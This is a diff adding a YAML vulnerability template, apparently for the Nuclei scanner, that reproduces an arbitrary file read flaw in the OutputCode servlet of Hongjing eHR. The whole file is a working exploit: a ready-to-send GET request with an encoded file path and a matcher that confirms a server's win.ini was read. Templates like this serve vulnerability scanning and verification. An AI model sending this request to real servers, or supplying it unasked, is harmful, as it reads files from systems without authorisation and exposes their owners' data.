@@ -1,0 +1,26 @@
+id: HJeHR-OutputCode-File-reading
+
+info:
+  name: 宏景eHR OutputCode 任意文件读取漏洞复现
+  author: Superhero
+  severity: high
+  description: 宏景eHR OutputCode存在任意文件读取漏洞
+  tags: File reading
+  
+http:
+  - raw:
+      - |
+        GET /servlet/OutputCode?path=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
+
